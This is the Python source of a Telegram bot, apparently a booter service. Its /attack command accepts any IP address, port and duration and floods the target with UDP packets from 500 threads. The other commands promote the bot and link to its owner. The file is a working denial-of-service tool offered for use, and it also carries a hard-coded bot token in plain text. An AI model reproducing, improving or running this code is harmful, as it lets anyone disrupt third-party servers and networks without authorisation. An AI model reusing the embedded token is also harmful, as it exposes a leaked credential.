import socket
import time
import asyncio
import random
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# 👉 अपने Telegram Bot का Token यहाँ डालें
BOT_TOKEN = "7744875151:AAF8P1vSd8awHrmaGmWQiI6d-S_fgoPvLkY"

# /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_text = """
*🌟 Welcome to the Ultimate Command Center!*

*Here’s what you can do:*  
1. *`/attack` - ⚔️ Launch a powerful attack and show your skills!*  
2. *`/myinfo` - 👤 Check your account info and stay updated.*  
3. *`/owner` - 📞 Get in touch with the mastermind behind this bot!*  
4. *`/when` - ⏳ Curious about the bot's status? Find out now!*  
5. *`/canary` - 🦅 Grab the latest Canary version for cutting-edge features.*  
6. *`/rules` - 📜 Review the rules to keep the game fair and fun.*  

*💡 Got questions? Don't hesitate to ask! Your satisfaction is our priority!*
"""
    keyboard = [
        [InlineKeyboardButton("☣️ 𝗖𝗼𝗻𝘁𝗮𝗰𝘁 𝗢𝘄𝗻𝗲𝗿 ☣️", url="https://t.me/VIP_OWNER9")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_markdown(welcome_text, reply_markup=reply_markup)

# UDP Flood Function
def send_flood(ip, port, duration):
    timeout = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet = random._urandom(1024)
    while time.time() < timeout:
        try:
            for _ in range(1000):
                sock.sendto(packet, (ip, port))
        except:
            break
    sock.close()

# Start Attack
def start_attack(ip, port, duration, threads=500):
    print(f"[🔥] Launching massive UDP flood on {ip}:{port} for {duration} sec with {threads} threads.")
    thread_list = []
    for _ in range(threads):
        t = threading.Thread(target=send_flood, args=(ip, port, duration))
        t.start()
        thread_list.append(t)
    for t in thread_list:
        t.join()
    print("[💥] Flood completed.")

# /attack command
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if len(context.args) != 3:
        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>")
        return
    ip = context.args[0]
    try:
        port = int(context.args[1])
        duration = int(context.args[2])
    except:
        await update.message.reply_text("❌ Port and duration must be numbers.")
        return

    await update.message.reply_text(f"🚀 Sending THOUSANDS of packets to {ip}:{port} for {duration} seconds 🔥")
    loop = asyncio.get_event_loop()
    await loop.run_in_executor(None, start_attack, ip, port, duration)
    await update.message.reply_text("✅ Done! Target should be flooded.")

# /myinfo command
async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"👤 *Your Info:*\n\n"
        f"🆔 ID: `{user.id}`\n"
        f"🙋‍♂️ Name: {user.full_name}\n"
        f"📧 Username: @{user.username if user.username else 'N/A'}",
        parse_mode="Markdown"
    )

# /owner command
async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📞 Contact Owner:\n👉 [VIP_OWNER9](https://t.me/VIP_OWNER9)", parse_mode="Markdown")

# /when command
async def when(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("⏳ Bot is running 24/7 non-stop like a beast! 🐉")

# /canary command
async def canary(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🦅 Canary Version: v9.11-beta\n🔗 Stay updated for experimental features!")

# /rules command
async def rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "📜 *Bot Rules:*\n"
        "1. No misuse or illegal activities.\n"
        "2. Respect usage limits.\n"
        "3. Owner decisions are final.\n"
        "4. Be cool 😎 and have fun!",
        parse_mode="Markdown"
    )

# Bot Run
if __name__ == "__main__":
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("owner", owner))
    app.add_handler(CommandHandler("when", when))
    app.add_handler(CommandHandler("canary", canary))
    app.add_handler(CommandHandler("rules", rules))
    app.run_polling()
